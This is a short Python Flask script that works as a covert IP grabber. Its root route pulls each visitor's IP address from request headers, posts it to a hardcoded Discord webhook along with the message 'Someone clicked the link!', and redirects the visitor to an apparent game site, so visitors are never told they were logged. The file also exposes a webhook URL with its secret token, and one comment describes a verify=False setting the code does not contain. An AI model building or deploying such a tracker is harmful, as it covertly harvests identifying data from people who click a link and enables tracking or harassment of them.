# Import necessary libraries for the Flask web application
from flask import Flask, request, redirect
import requests
import os

# Initialize the Flask application
app = Flask(__name__)

# --- Configuration ---
# Your Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1382611407199014912/A6GHc65WzrRbciHynuMssat9MI0eYlONJTq3sinrx5TtmjGpCFtc7qCwlfirzh_qxfPd"

# The final URL to redirect to after sending the IP to Discord
TARGET_REDIRECT_URL = "https://game.up.railway.app"
# --- End Configuration ---

@app.route('/')
def track_ip_and_redirect():
    """
    This route captures the client's IP address, sends it to a Discord webhook,
    and then redirects the client to the TARGET_REDIRECT_URL.
    """
    user_ip = None

    # Attempt to get the IP address from common proxy headers first (e.g., X-Forwarded-For)
    # This is crucial when the app is behind a load balancer or proxy like on Railway.
    if request.headers.get('X-Forwarded-For'):
        # X-Forwarded-For can contain multiple IPs separated by commas (e.g., "client_ip, proxy_ip, proxy_ip").
        # We want the first one, which is typically the client's original IP.
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        # Fallback to remote_addr if X-Forwarded-For is not present.
        # This is the direct IP of the connecting client or the immediate proxy.
        user_ip = request.remote_addr

    # Prepare the message payload for the Discord webhook
    if user_ip:
        discord_payload = {
            "content": f"Someone clicked the link! IP Address: `{user_ip}`"
        }
    else:
        discord_payload = {
            "content": "Someone clicked the link, but IP address could not be determined."
        }

    try:
        # Send the POST request to the Discord webhook
        # We use a timeout to prevent the user from waiting too long if Discord is slow.
        # We also set verify=False for simplicity, but in a production environment,
        # you might want to ensure SSL verification is robust.
        response = requests.post(DISCORD_WEBHOOK_URL, json=discord_payload, timeout=5)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        print(f"Successfully sent IP '{user_ip}' to Discord webhook. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        # Log any errors that occur during the webhook sending process
        print(f"Error sending IP to Discord webhook: {e}")

    # Redirect the user to the target URL regardless of whether the webhook succeeded or failed.
    # This ensures the user always reaches their destination.
    return redirect(TARGET_REDIRECT_URL)

# This block ensures the Flask app runs when the script is executed directly.
# It uses '0.0.0.0' as the host to make it accessible from outside the container
# when deployed, and it uses the PORT environment variable if available (common in hosting environments).
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000)) # Default to 5000 if PORT env var is not set
    app.run(host='0.0.0.0', port=port)

